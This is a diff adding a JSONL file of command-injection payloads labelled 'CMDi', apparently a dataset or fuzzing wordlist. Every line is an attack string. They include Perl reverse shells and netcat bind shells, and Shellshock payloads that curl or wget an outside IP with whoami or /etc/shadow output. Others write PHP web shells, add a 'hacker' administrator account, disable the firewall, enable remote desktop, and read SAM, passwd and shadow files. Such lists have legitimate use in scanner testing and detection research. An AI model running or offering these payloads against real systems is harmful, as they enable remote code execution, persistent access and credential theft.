@@ -1,0 +1,443 @@
+{"payload": "which curl", "type": "CMDi"}
+{"payload": "&& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "type": "CMDi"}
+{"payload": "which netcat", "type": "CMDi"}
+{"payload": "; ifconfig", "type": "CMDi"}
+{"payload": "%0a ping -i 30 127.0.0.1 %0a", "type": "CMDi"}
+{"payload": "& dir C:\\Users", "type": "CMDi"}
+{"payload": "; net user hacker Password1 /ADD", "type": "CMDi"}
+{"payload": "%20{${sleep(3)}}", "type": "CMDi"}
+{"payload": "& uname -a", "type": "CMDi"}
+{"payload": "() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11", "type": "CMDi"}
+{"payload": "a|id|", "type": "CMDi"}
+{"payload": "&& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "type": "CMDi"}
+{"payload": "ipconfig", "type": "CMDi"}
+{"payload": "'\"", "type": "CMDi"}
+{"payload": "; ls -l /etc/", "type": "CMDi"}
+{"payload": "& ipconfig /all", "type": "CMDi"}
+{"payload": "; net localgroup Administrators hacker /ADD", "type": "CMDi"}
+{"payload": "& phpinfo()", "type": "CMDi"}
+{"payload": "&& sleep 10", "type": "CMDi"}
+{"payload": "\" || whoami", "type": "CMDi"}
+{"payload": "eval('ls')", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9\"", "type": "CMDi"}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\\n", "type": "CMDi"}
+{"payload": "type C:\\Windows\\repair\\SAM", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1234 -e /bin/bash\\`\"", "type": "CMDi"}
+{"payload": "; type C:\\Windows\\repair\\SAM", "type": "CMDi"}
+{"payload": "system('sleep 5');", "type": "CMDi"}
+{"payload": "&& ipconfig /all", "type": "CMDi"}
+{"payload": "exec('whoami')", "type": "CMDi"}
+{"payload": "ls -l /var/www/*", "type": "CMDi"}
+{"payload": "&&type C:\\\\boot.ini", "type": "CMDi"}
+{"payload": "system('whoami');", "type": "CMDi"}
+{"payload": "& perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "&& sleep 15", "type": "CMDi"}
+{"payload": "\\nid\\n", "type": "CMDi"}
+{"payload": "system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "&& perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "type C:\\WINNT\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "; perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "echo \"<?php include($_GET['page']); ?>\" > rfi.php", "type": "CMDi"}
+{"payload": "%20{${sleep(20)}}", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\"", "type": "CMDi"}
+{"payload": "| net localgroup Administrators hacker /ADD", "type": "CMDi"}
+{"payload": "() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\\\");'", "type": "CMDi"}
+{"payload": "{{[] .__ Class __.__ base __.__ subclasses __ ()}}", "type": "CMDi"}
+{"payload": "| ls -l /", "type": "CMDi"}
+{"payload": "\\n\\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\\`whoami\\`", "type": "CMDi"}
+{"payload": "echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX", "type": "CMDi"}
+{"payload": "which gcc", "type": "CMDi"}
+{"payload": "& sleep 5", "type": "CMDi"}
+{"payload": "; reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "type": "CMDi"}
+{"payload": "&& ls -l /", "type": "CMDi"}
+{"payload": "&& ls -laR /etc", "type": "CMDi"}
+{"payload": "' & whoami", "type": "CMDi"}
+{"payload": "& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "type": "CMDi"}
+{"payload": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\`whoami\\`\"", "type": "CMDi"}
+{"payload": "&& ls -laR /var/www", "type": "CMDi"}
+{"payload": "&& type %SYSTEMROOT%\\repair\\SAM", "type": "CMDi"}
+{"payload": "; netsh firewall set opmode disable", "type": "CMDi"}
+{"payload": "\\n/usr/bin/id\\n", "type": "CMDi"}
+{"payload": "type C:\\WINNT\\repair\\SAM", "type": "CMDi"}
+{"payload": "&& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "uname -a", "type": "CMDi"}
+{"payload": ";|/usr/bin/id|", "type": "CMDi"}
+{"payload": "<?php system(\"sleep 10\");?>", "type": "CMDi"}
+{"payload": "netstat", "type": "CMDi"}
+{"payload": "&& dir C:\\Users", "type": "CMDi"}
+{"payload": "; sleep 10", "type": "CMDi"}
+{"payload": "&&", "type": "CMDi"}
+{"payload": "test* & perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "`id`", "type": "CMDi"}
+{"payload": "& sleep 15", "type": "CMDi"}
+{"payload": "; sysinfo", "type": "CMDi"}
+{"payload": "&& net user hacker Password1 /ADD", "type": "CMDi"}
+{"payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc\");?>", "type": "CMDi"}
+{"payload": "uname", "type": "CMDi"}
+{"payload": "ipconfig /all", "type": "CMDi"}
+{"payload": "system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23')", "type": "CMDi"}
+{"payload": "exec('sleep 5');", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7\"", "type": "CMDi"}
+{"payload": "ls -l /tmp", "type": "CMDi"}
+{"payload": "%20{${phpinfo()}}", "type": "CMDi"}
+{"payload": "& perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "| sleep 5", "type": "CMDi"}
+{"payload": "| echo \"<?php system($_GET['cmd'])| ?>\" > cmd.php", "type": "CMDi"}
+{"payload": ";phpinfo()", "type": "CMDi"}
+{"payload": "| echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "type": "CMDi"}
+{"payload": "; whoami", "type": "CMDi"}
+{"payload": "echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "type": "CMDi"}
+{"payload": "\\nid;", "type": "CMDi"}
+{"payload": "sysinfo", "type": "CMDi"}
+{"payload": "{${sleep(20)}}", "type": "CMDi"}
+{"payload": "|", "type": "CMDi"}
+{"payload": "$;/usr/bin/id", "type": "CMDi"}
+{"payload": "eval('sleep 5');", "type": "CMDi"}
+{"payload": "& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "type": "CMDi"}
+{"payload": "%0a id %0a", "type": "CMDi"}
+{"payload": "ls -l /etc/", "type": "CMDi"}
+{"payload": "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->", "type": "CMDi"}
+{"payload": "; sleep 5", "type": "CMDi"}
+{"payload": "| net user hacker Password1 /ADD", "type": "CMDi"}
+{"payload": "\\n", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x2048'", "type": "CMDi"}
+{"payload": "nc -lvvp 4444 -e /bin/sh", "type": "CMDi"}
+{"payload": "; ls -l /tmp", "type": "CMDi"}
+{"payload": "& net localgroup Administrators hacker /ADD", "type": "CMDi"}
+{"payload": ";{$_GET[\"cmd\"]}", "type": "CMDi"}
+{"payload": "system('whoami')", "type": "CMDi"}
+{"payload": "; perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "; dir C:\\Users", "type": "CMDi"}
+{"payload": "dir", "type": "CMDi"}
+{"payload": "& ping -i 30 127.0.0.1 &", "type": "CMDi"}
+{"payload": "%0Aid%0A", "type": "CMDi"}
+{"payload": "() { :;}; echo vulnerable 10", "type": "CMDi"}
+{"payload": "systeminfo", "type": "CMDi"}
+{"payload": "phpinfo()", "type": "CMDi"}
+{"payload": "| ls -l /tmp", "type": "CMDi"}
+{"payload": "wget https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "; echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"", "type": "CMDi"}
+{"payload": "& echo \"<?php include($_GET['page']); ?>\" > rfi.php", "type": "CMDi"}
+{"payload": "$(`whoami`)", "type": "CMDi"}
+{"payload": "${@print(system($_SERVER['HTTP_USER_AGENT']))}", "type": "CMDi"}
+{"payload": "\\nid|", "type": "CMDi"}
+{"payload": "echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "type": "CMDi"}
+{"payload": "'; whoami", "type": "CMDi"}
+{"payload": "test* | perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\\`nc -lvvp 1236 -e /bin/bash &\\`\"", "type": "CMDi"}
+{"payload": "| netstat -an", "type": "CMDi"}
+{"payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt')", "type": "CMDi"}
+{"payload": "|id", "type": "CMDi"}
+{"payload": "&& net localgroup Administrators hacker /ADD", "type": "CMDi"}
+{"payload": "; type %SYSTEMROOT%\\repair\\SAM", "type": "CMDi"}
+{"payload": "; dir C:\\", "type": "CMDi"}
+{"payload": "; net view", "type": "CMDi"}
+{"payload": "{{ get_user_file(\"/etc/hosts\") }}", "type": "CMDi"}
+{"payload": "eval('whoami')", "type": "CMDi"}
+{"payload": "; dir C:\\Documents and Settings\\*", "type": "CMDi"}
+{"payload": "curl https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "{{4+4}}", "type": "CMDi"}
+{"payload": "%0Aid", "type": "CMDi"}
+{"payload": "echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "type": "CMDi"}
+{"payload": "ls -lh /etc/", "type": "CMDi"}
+{"payload": "net localgroup Administrators hacker /ADD", "type": "CMDi"}
+{"payload": "ls -l /home/*", "type": "CMDi"}
+{"payload": "& echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\" > rev.pl", "type": "CMDi"}
+{"payload": "' && whoami", "type": "CMDi"}
+{"payload": "&& ls -l /home/*", "type": "CMDi"}
+{"payload": "&", "type": "CMDi"}
+{"payload": "cat /etc/hosts", "type": "CMDi"}
+{"payload": "\"; whoami", "type": "CMDi"}
+{"payload": "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->", "type": "CMDi"}
+{"payload": "; echo \"use Socket;$i=\"192.168.16.151\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">;S\");open(STDOUT,\">;S\");open(STDERR,\">;S\");exec(\"/bin/sh -i\");};\" > rev.pl", "type": "CMDi"}
+{"payload": "; perl -e 'print \"X\"x8096'", "type": "CMDi"}
+{"payload": "exec('pwd')", "type": "CMDi"}
+{"payload": "| type C:\\Windows\\repair\\SAM", "type": "CMDi"}
+{"payload": "exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "type": "CMDi"}
+{"payload": ";id\\n", "type": "CMDi"}
+{"payload": "| type C:\\Windows\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "&& type C:\\Windows\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "; ls -l /var/www/*", "type": "CMDi"}
+{"payload": "| perl -e 'print \"X\"x8096'", "type": "CMDi"}
+{"payload": "type C:\\Windows\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "| perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "| systeminfo", "type": "CMDi"}
+{"payload": "& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "type": "CMDi"}
+{"payload": "<?php system(\"wget https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>", "type": "CMDi"}
+{"payload": "| sysinfo", "type": "CMDi"}
+{"payload": "\"", "type": "CMDi"}
+{"payload": "system('ls')", "type": "CMDi"}
+{"payload": "|| phpinfo()", "type": "CMDi"}
+{"payload": "{1} + {1}", "type": "CMDi"}
+{"payload": "| dir C:\\", "type": "CMDi"}
+{"payload": "%0Acat%20/etc/passwd", "type": "CMDi"}
+{"payload": ";/usr/bin/id|", "type": "CMDi"}
+{"payload": "exec('whoami');", "type": "CMDi"}
+{"payload": "&& type C:\\Windows\\repair\\SAM", "type": "CMDi"}
+{"payload": "|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "{${sleep(10)}}", "type": "CMDi"}
+{"payload": "&& systeminfo", "type": "CMDi"}
+{"payload": "| dir", "type": "CMDi"}
+{"payload": "| type %SYSTEMROOT%\\repair\\SAM", "type": "CMDi"}
+{"payload": "| dir C:\\Users", "type": "CMDi"}
+{"payload": "& wget http://crowdshield.com/.testing/rce.txt", "type": "CMDi"}
+{"payload": ";id|", "type": "CMDi"}
+{"payload": "nc -lvvp 4445 -e /bin/sh &", "type": "CMDi"}
+{"payload": "| ls -l /var/www/*", "type": "CMDi"}
+{"payload": "eval('sleep 5')", "type": "CMDi"}
+{"payload": "exec('pwd');", "type": "CMDi"}
+{"payload": "nc -lvvp 4446 -e /bin/sh|", "type": "CMDi"}
+{"payload": "&& reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\\`pwd\\`\"", "type": "CMDi"}
+{"payload": "; type C:\\WINNT\\repair\\SAM", "type": "CMDi"}
+{"payload": "sleep 1", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x81920'", "type": "CMDi"}
+{"payload": "$(`dir`)", "type": "CMDi"}
+{"payload": "nc -lvvp 4447 -e /bin/sh;", "type": "CMDi"}
+{"payload": "{{ get_user_file(\"C:\\boot.ini\") }}", "type": "CMDi"}
+{"payload": "%0A/usr/bin/id%0A", "type": "CMDi"}
+{"payload": "/index.html|id|", "type": "CMDi"}
+{"payload": "type %SYSTEMROOT%\\repair\\SAM", "type": "CMDi"}
+{"payload": "&& sleep 1", "type": "CMDi"}
+{"payload": "route", "type": "CMDi"}
+{"payload": "`", "type": "CMDi"}
+{"payload": "& netsh firewall set opmode disable", "type": "CMDi"}
+{"payload": "dir C:\\", "type": "CMDi"}
+{"payload": ";echo%20'<script>alert(1)</script>'", "type": "CMDi"}
+{"payload": "|| sleep 10", "type": "CMDi"}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\\n", "type": "CMDi"}
+{"payload": "test* && perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "&& nc -lvvp 4444 -e /bin/sh &", "type": "CMDi"}
+{"payload": "which wget", "type": "CMDi"}
+{"payload": "nc -lvvp 4448 -e /bin/sh&", "type": "CMDi"}
+{"payload": "netstat -an", "type": "CMDi"}
+{"payload": "& sleep 1", "type": "CMDi"}
+{"payload": ";", "type": "CMDi"}
+{"payload": "| netsh firewall set opmode disable", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\\`uname -a\\`\"", "type": "CMDi"}
+{"payload": "|| perl -e 'print \"X\"x8096'", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\`uname -a\\`\"", "type": "CMDi"}
+{"payload": "ls -l /", "type": "CMDi"}
+{"payload": "{{4+8}}", "type": "CMDi"}
+{"payload": "; type %SYSTEMROOT%\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "type %SYSTEMROOT%\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "; system('sleep 5');", "type": "CMDi"}
+{"payload": "& ls -l /tmp", "type": "CMDi"}
+{"payload": "| ls -l /home/*", "type": "CMDi"}
+{"payload": "| pwd", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=4\"", "type": "CMDi"}
+{"payload": "sleep 5", "type": "CMDi"}
+{"payload": "dir C:\\Documents and Settings\\*", "type": "CMDi"}
+{"payload": "a;id\\n", "type": "CMDi"}
+{"payload": "& type %SYSTEMROOT%\\repair\\SAM", "type": "CMDi"}
+{"payload": "& id", "type": "CMDi"}
+{"payload": "&& wget https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "& type C:\\Windows\\repair\\SAM", "type": "CMDi"}
+{"payload": "exec('sleep 5')", "type": "CMDi"}
+{"payload": "| wget http://crowdshield.com/.testing/rce.txt", "type": "CMDi"}
+{"payload": "| ipconfig /all", "type": "CMDi"}
+{"payload": "| ls -laR /var/www", "type": "CMDi"}
+{"payload": "net user hacker Password1 /ADD", "type": "CMDi"}
+{"payload": "&& echo \"<?php system('dir $_GET['dir']'); ?>\" > dir.php", "type": "CMDi"}
+{"payload": "& type C:\\WINNT\\repair\\SAM", "type": "CMDi"}
+{"payload": ":phpversion();", "type": "CMDi"}
+{"payload": "test*; ls -lhtR /var/www/", "type": "CMDi"}
+{"payload": "| echo \"<?php system('dir $_GET['dir']')| ?>\" > dir.php", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\\`grep root /etc/shadow\\`\"", "type": "CMDi"}
+{"payload": "; ls -l /", "type": "CMDi"}
+{"payload": "() { :;}; curl http://135.23.158.130/.testing/shellshock.txt?vuln=12", "type": "CMDi"}
+{"payload": "a;id;", "type": "CMDi"}
+{"payload": "{{person.secret}}", "type": "CMDi"}
+{"payload": "&& phpinfo()", "type": "CMDi"}
+{"payload": "&& ls -l /etc/", "type": "CMDi"}
+{"payload": "; pwd", "type": "CMDi"}
+{"payload": "| ls -l /etc/", "type": "CMDi"}
+{"payload": "<?php system(\"cat /etc/passwd\");?>", "type": "CMDi"}
+{"payload": "$(`cat /etc/passwd`)", "type": "CMDi"}
+{"payload": "%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1", "type": "CMDi"}
+{"payload": "& ls -laR /var/www", "type": "CMDi"}
+{"payload": "{{person.name}}", "type": "CMDi"}
+{"payload": "dir C:\\Users", "type": "CMDi"}
+{"payload": "curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\\\" |curl https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "exec('ls')", "type": "CMDi"}
+{"payload": "&& uname -a", "type": "CMDi"}
+{"payload": "& net view", "type": "CMDi"}
+{"payload": ";system('cat%20/etc/passwd')", "type": "CMDi"}
+{"payload": "&& netstat -an", "type": "CMDi"}
+{"payload": "& ping -n 30 127.0.0.1 &", "type": "CMDi"}
+{"payload": "& ifconfig", "type": "CMDi"}
+{"payload": "&& pwd", "type": "CMDi"}
+{"payload": "\" whoami", "type": "CMDi"}
+{"payload": "& sysinfo", "type": "CMDi"}
+{"payload": "& systeminfo", "type": "CMDi"}
+{"payload": ";id;", "type": "CMDi"}
+{"payload": "%0a%0d", "type": "CMDi"}
+{"payload": "| net view", "type": "CMDi"}
+{"payload": "\\r\\n", "type": "CMDi"}
+{"payload": "system('cat C:\\boot.ini');", "type": "CMDi"}
+{"payload": "&& dir", "type": "CMDi"}
+{"payload": "&& echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "type": "CMDi"}
+{"payload": "&& system('sleep 5');", "type": "CMDi"}
+{"payload": "; systeminfo", "type": "CMDi"}
+{"payload": "*; ls -lhtR /var/www/", "type": "CMDi"}
+{"payload": "system('curl https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2wdf')", "type": "CMDi"}
+{"payload": "\"'", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\"", "type": "CMDi"}
+{"payload": "phpinfo();", "type": "CMDi"}
+{"payload": "| uname -a", "type": "CMDi"}
+{"payload": "whoami", "type": "CMDi"}
+{"payload": "| id", "type": "CMDi"}
+{"payload": "& ls -l /", "type": "CMDi"}
+{"payload": "& system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?method=phpsystem_get\");?>", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\\`grep root /etc/shadow\\`\"", "type": "CMDi"}
+{"payload": "| whoami", "type": "CMDi"}
+{"payload": "\" && whoami", "type": "CMDi"}
+{"payload": "; echo \"<?php include($_GET['page']); ?>\" > rfi.php", "type": "CMDi"}
+{"payload": "||", "type": "CMDi"}
+{"payload": "&& sleep 5", "type": "CMDi"}
+{"payload": "<!--#exec cmd=\"/usr/bin/id;-->", "type": "CMDi"}
+{"payload": "|| perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "&& ls -l /tmp", "type": "CMDi"}
+{"payload": "| dir C:\\Documents and Settings\\*", "type": "CMDi"}
+{"payload": "';phpinfo();//", "type": "CMDi"}
+{"payload": "; ls -laR /var/www", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\\`nc -lvvp 1237 -e /bin/bash &\\`\"", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6\"", "type": "CMDi"}
+{"payload": "\\r", "type": "CMDi"}
+{"payload": "\" & whoami", "type": "CMDi"}
+{"payload": "cat /etc/passwd", "type": "CMDi"}
+{"payload": "| ls -laR /etc", "type": "CMDi"}
+{"payload": "netsh firewall set opmode disable", "type": "CMDi"}
+{"payload": "; type C:\\Windows\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": ";${@print(md5(RCEVulnerable))};", "type": "CMDi"}
+{"payload": "& dir C:\\", "type": "CMDi"}
+{"payload": "; nc -lvvp 4444 -e /bin/sh;", "type": "CMDi"}
+{"payload": "which perl", "type": "CMDi"}
+{"payload": "system('cat config.php');", "type": "CMDi"}
+{"payload": "| ifconfig", "type": "CMDi"}
+{"payload": "; uname -a", "type": "CMDi"}
+{"payload": "pwd", "type": "CMDi"}
+{"payload": "& ls -laR /etc", "type": "CMDi"}
+{"payload": "| sleep 15", "type": "CMDi"}
+{"payload": "&& netsh firewall set opmode disable", "type": "CMDi"}
+{"payload": "system('cat /etc/passwd');", "type": "CMDi"}
+{"payload": "& curl http://crowdshield.com/.testing/rce.txt", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x4096'", "type": "CMDi"}
+{"payload": "| system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\\`nc -lvvp 1235 -e /bin/bash\\`\"", "type": "CMDi"}
+{"payload": "| sleep 10", "type": "CMDi"}
+{"payload": "net view", "type": "CMDi"}
+{"payload": "$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\`whoami\\`\"", "type": "CMDi"}
+{"payload": "which python", "type": "CMDi"}
+{"payload": ";uname;", "type": "CMDi"}
+{"payload": "system('sleep 5')", "type": "CMDi"}
+{"payload": "; dir", "type": "CMDi"}
+{"payload": "& type C:\\Windows\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "' whoami", "type": "CMDi"}
+{"payload": "; ls -laR /etc", "type": "CMDi"}
+{"payload": "${@print(\"RCEVulnerable\")}", "type": "CMDi"}
+{"payload": "|| system('sleep 5');", "type": "CMDi"}
+{"payload": "; echo \"<?php system($_GET['cmd']); ?>\" > cmd.php", "type": "CMDi"}
